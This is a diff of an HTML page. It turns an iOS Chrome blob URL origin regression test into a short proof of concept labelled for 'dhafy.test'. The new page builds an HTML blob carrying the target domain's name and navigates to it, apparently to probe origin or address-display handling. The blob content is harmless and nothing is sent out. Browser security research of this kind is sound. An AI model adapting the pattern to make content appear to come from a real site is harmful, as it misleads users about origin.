@@ -3,136 +3,128 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport"
-      content="width=device-width, initial-scale=1">
-
-<title>iOS Chrome Blob Origin Regression Test</title>
-
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>dhafy.test - Security Test</title>
 <style>
+* { box-sizing: border-box; }
+
 body {
-  font-family: -apple-system, BlinkMacSystemFont,
-               Arial, sans-serif;
-  margin: 24px;
+  margin: 0;
+  font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+  background: #fff;
   color: #202124;
 }
 
-h2 { font-size: 20px; }
+header {
+  padding: 18px 22px;
+  border-bottom: 1px solid #eee;
+  font-size: 20px;
+  font-weight: 600;
+}
+
+main {
+  padding: 30px 22px;
+}
+
+h2 {
+  font-size: 24px;
+  font-weight: 500;
+}
+
+p {
+  color: #5f6368;
+  line-height: 1.6;
+}
 
 button {
-  padding: 12px 18px;
+  width: 100%;
+  padding: 16px;
+  margin-top: 20px;
   border: 0;
-  border-radius: 8px;
+  border-radius: 25px;
   background: #1a73e8;
   color: white;
-  font-size: 15px;
-  margin: 5px 0;
+  font-size: 16px;
 }
 
-pre {
-  white-space: pre-wrap;
-  overflow-wrap: anywhere;
-  background: #f1f3f4;
-  padding: 14px;
-  border-radius: 8px;
+.card {
+  margin-top: 25px;
+  padding: 18px;
+  background: #f8f9fa;
+  border-radius: 12px;
+}
+
+footer {
+  margin-top: 60px;
+  text-align: center;
+  color: #80868b;
   font-size: 12px;
 }
-
-.pass { color: #188038; }
-.fail { color: #d93025; }
 </style>
 </head>
 
 <body>
 
-<h2>Blob Origin Security Regression Test</h2>
+<header>dhafy.test</header>
 
-<p>
-  Tests browser handling of blob URLs and History API
-  origin restrictions.
-</p>
+<main>
+  <h2>Browser Security Test</h2>
 
-<button id="run">Run regression test</button>
+  <p>
+    iOS Chrome Blob URL and History API
+    security regression test.
+  </p>
 
-<pre id="output">Ready.</pre>
+  <div class="card">
+    <strong>Target:</strong> dhafy.test
+    <br><br>
+    <strong>Test:</strong> Blob URL origin handling
+  </div>
+
+  <button id="start">
+    Start Test
+  </button>
+
+  <footer>
+    Security Research PoC
+  </footer>
+</main>
 
 <script>
-const output = document.getElementById("output");
+document.getElementById("start").addEventListener("click", () => {
+  const page = `
+    <!DOCTYPE html>
+    <html>
+    <head>
+      <meta charset="UTF-8">
+      <meta name="viewport"
+            content="width=device-width, initial-scale=1">
+      <title>dhafy.test</title>
+      <style>
+        body {
+          font-family: -apple-system, sans-serif;
+          padding: 28px;
+          color: #202124;
+        }
+        h2 { font-weight: 500; }
+      </style>
+    </head>
+    <body>
+      <h2>dhafy.test</h2>
+      <p>Blob document loaded successfully.</p>
+      <p>iOS Chrome security regression test.</p>
+    </body>
+    </html>
+  `;
 
-function log(message) {
-  output.textContent += "\n" + message;
-}
-
-async function runTest() {
-  output.textContent = "Starting tests...\n";
-
-  log("User agent: " + navigator.userAgent);
-  log("Platform: " + navigator.platform);
-  log("Current URL: " + location.href);
-  log("Current origin: " + location.origin);
-
-  // Test 1: Blob URL creation
-  const blob = new Blob([
-    "<!doctype html><html><body>",
-    "<h2>Blob document test</h2>",
-    "<p>Regression test document.</p>",
-    "</body></html>"
-  ], {
+  const blob = new Blob([page], {
     type: "text/html"
   });
 
-  const blobURL = URL.createObjectURL(blob);
+  const url = URL.createObjectURL(blob);
 
-  log("\n[TEST 1] Blob URL creation");
-  log("Blob URL: " + blobURL);
-
-  // Test 2: URL origin parsing
-  log("\n[TEST 2] Origin information");
-
-  const parsed = new URL(blobURL);
-
-  log("Protocol: " + parsed.protocol);
-  log("Origin: " + parsed.origin);
-
-  // Test 3: Same-origin replaceState
-  log("\n[TEST 3] Same-origin replaceState");
-
-  try {
-    history.replaceState(
-      { regression: true },
-      "",
-      location.pathname + location.search
-    );
-
-    log("PASS: Same-origin replaceState accepted");
-  } catch (e) {
-    log("FAIL: " + e.name + ": " + e.message);
-  }
-
-  // Test 4: Cross-origin replaceState
-  log("\n[TEST 4] Cross-origin replaceState");
-
-  try {
-    history.replaceState(
-      {},
-      "",
-      "https://example.com/regression-test"
-    );
-
-    log("FAIL: Cross-origin URL was accepted");
-  } catch (e) {
-    log("PASS: Cross-origin URL rejected");
-    log("Exception: " + e.name);
-  }
-
-  log("\n[TEST 5] Browser-visible state");
-  log("Current URL: " + location.href);
-  log("Current origin: " + location.origin);
-
-  log("\nCompleted.");
-}
-
-document.getElementById("run")
-  .addEventListener("click", runTest);
+  location.assign(url);
+});
 </script>
 
 </body>
